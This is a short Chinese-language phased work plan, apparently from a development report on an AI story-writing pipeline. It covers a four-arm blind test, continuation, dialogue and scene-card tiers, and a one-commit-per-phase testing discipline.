1. **四臂盲测先行**（检验门槛，复用 phase_b_matrix/budget/evidence 骨架，Writer 推理模式作附加维度）；
2. 续写档（context compiler 首个完整客户 + 记账调用 + 回合小票）——依赖评审 P0 的 V1/V2 修复；
3. 对手戏档（run_duet + 定稿 prompt）；
4. 场景卡 + 大场面档收编现有流水线；
5. 全程沿用"一阶段一提交 + 指定测试"纪律，每阶段回写本报告状态。
